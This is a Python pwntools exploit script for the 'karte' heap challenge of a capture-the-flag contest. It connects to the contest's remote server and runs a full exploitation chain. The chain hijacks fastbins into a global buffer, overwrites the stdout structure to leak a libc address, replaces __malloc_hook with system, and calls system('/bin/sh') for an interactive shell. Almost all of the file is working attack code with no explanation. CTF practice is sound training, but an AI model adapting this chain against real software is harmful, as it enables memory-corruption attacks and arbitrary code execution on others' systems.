from pwn import *
 
e = ELF('./karte')
libc = e.libc
def attack(r):
   
    def alloc(content, size=None):
        if not size:
            size = len(content)+1
        r.sendlineafter('> ', '1')
        r.sendlineafter('Input size > ', str(size))
        r.sendafter('Input description > ', content)
        r.recvuntil('Added id ')
        key = r.recvline().strip()
        return key
    def rename(name):
        r.sendlineafter('> ', '99')
        r.sendafter('Input patient name... ', name)
    def delete(key):
        r.sendlineafter('> ', '3')
        r.sendlineafter('Input id > ', key)
    def modify(key, content):
        r.sendlineafter('> ', '4')
        r.sendlineafter('Input id > ', key)
        r.sendafter('Input new description > ', content)
    def fast_delete(key):
        r.recvuntil('> ')
        r.send('3'.ljust(0x1f, '\x00')+str(key).ljust(0x1f, '\x00'))
    def fast_alloc(content, size=None):
        if not size:
            size = len(content)+1
        r.recvuntil('> ')
        r.send('1'.ljust(0x1f, '\x00')+str(size).ljust(0x1f, '\x00')+content)
        r.recvuntil('Added id ')
        key = r.recvline().strip()
        return key
 
    r.sendafter('Input patient name... ', p64(0)+p64(0x81)+p64(0x6021c0)+p64(0)*2+p64(0x81))
 
    ####### Phase 1: allocation #######
    for i in range(7):
        #print(i)
        key = fast_alloc('A'*0x60)
        fast_delete(key)
    for i in range(7):
        #print(i)
        key = fast_alloc('A'*0x70)
        fast_delete(key)
    #for i in range(7):
    #    #print(i)
    #    key = fast_alloc('A'*0x3d0)
    #    fast_delete(key)
 
    key1 = alloc('A', 0x70)
    key2 = alloc('A', 0x70)
    key3 = alloc('A', 0x70)
 
    delete(key3)
    delete(key2)
    delete(key1)
 
    log.info('Pass Phase1 !!!')
 
    ######## Phase 2: hijack fastbin to name buffer ######
    modify(key1, p64(0x6021a0)[:3])
 
    key1 = alloc('A', 0x70)
    key2 = alloc(p64(0)*3+p64(0x81), 0x70)
    key3 = alloc(cyclic(0x48)+p64(0x21)+p64(0)*3+p64(0x21)[:7], 0x70)
 
    log.info('Pass Phase2 !!!')
 
    ######## Phase 3: prepare a libc address in victim 2 ######
    rename(p64(0)+p64(0x71)+p64(0)*3+p64(0x71))
 
    delete(key2)
    key2 = alloc('A', 0x420)
    delete(key2)
 
    delete(key3)
    delete(key1)
    key1 = alloc('A', 0x10)
    rename(p64(0)+p64(0x21)+p64(0)*3+p64(0x3e0))
 
    key2 = alloc('A', 0x3e0)
 
    rename(p64(0)+p64(0x21)+p64(0)*3+p64(0x71)+'\x1d\x07')
 
    log.info('Pass Phase3 !!!')
 
    ######## Phase 4: overwrite stdout to leak libc ########
    key3 = alloc('A', 0x60)
    delete(key1)
    payload = '\x00'*3+'\x00'*0x30+p64(0xfbad3c80)+p64(0)*3+'\x00'
    r.sendlineafter('> ', '1')
    r.sendlineafter('Input size > ', str(0x60-5))
    r.sendafter('Input description > ', payload)
 
    ###### leak libc #######
    r.recv(8)
    libc_base = u64(r.recv(8)) - 0x7ffff7dd18b0 + 0x00007ffff79e4000
    log.info('libc_base: %#x' % libc_base)
   
    ##### calc #####
    system = libc_base + libc.symbols['system']
    __malloc_hook = libc_base + libc.symbols['__malloc_hook']
   
    ###### overwrite __malloc_hook with system ######
    delete(key3)
    delete(key2)
    rename(p64(0)+p64(0x21)+p64(0)*3+p64(0x71)+p64(__malloc_hook-35))
   
    key1 = alloc('B'*1, 0x60)
    key2 = alloc('A'*19+p64(system), 0x60)
   
    ###### trigger malloc('/bin/sh\x00') -> system('/bin/sh\x00') ###
    delete(key1)
    rename(p64(0)+p64(0x71)+p64(0)+'/bin/sh\x00')
   
    r.sendlineafter('> ', '1')
    r.sendlineafter('Input size > ', str(0x6021b8))
    r.interactive()
 
#r = process('./karte')
#attack(r)
count = 0
while True:
    count += 1
    print(count)
    try:
        #r = process('./karte')
        #r = remote('127.0.0.1', 8333)
        r = remote('karte.chal.ctf.westerns.tokyo', 10001)
        attack(r)
        exit()
    except EOFError:
        r.close()
        pass